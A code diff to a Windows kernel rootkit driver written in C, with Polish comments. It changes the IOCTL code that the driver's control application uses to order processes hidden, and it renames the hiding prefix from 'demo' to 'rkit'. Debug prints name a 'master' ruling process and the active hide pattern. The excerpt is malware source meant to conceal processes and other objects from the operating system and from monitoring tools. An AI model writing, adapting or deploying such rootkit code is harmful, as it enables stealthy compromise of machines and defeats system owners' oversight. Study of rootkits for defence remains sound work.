@@ -9,7 +9,7 @@
 #define		FILE_DEVICE_ROOTKIT_DRIVER	FILE_DEVICE_UNKNOWN
 
 // ten kod IOCTL wykorzystujemy do komunikacji z aplikacja
-#define		IOCTL_HIDE_PROCESS			(ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT_DRIVER, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define		IOCTL_HIDE_PROCESS			(ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT_DRIVER, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 // lista zaladowanych modu³ów
 PMODULE_ENTRY	g_ModuleListBegin;
@@ -261,7 +261,7 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	}	
 	
 	// ciag ktory zawiera wzor do ukrycia, wersja ANSI
-	strcpy( hidePrefixA , "demo");
+	strcpy( hidePrefixA , "rkit");
 	DbgPrint( "rootkit: HIDE PATTERN %s\n",hidePrefixA);
 
 	rulingProcess = ExAllocatePool( NonPagedPool, 20);
@@ -272,8 +272,8 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	strcpy( rulingProcess , "master");
 	DbgPrint( "rootkit: RULING PROCESS: %s\n",rulingProcess);
 
-	// ciag ktory zawiera wzor do ukrycia, wersja UNICODE   
-	RtlInitUnicodeString( &hidePrefixW, L"demo");
+	// ciag ktory zawiera wzor do ukrycia, wersja UNICODE
+	RtlInitUnicodeString( &hidePrefixW, L"rkit");
 
     // wykorzystanie metody zaproponowanej przez Sysinternalsow do znalezienia 
     // offsetu do nazwy procesu wzgledem poczatku struktury EPROCESS
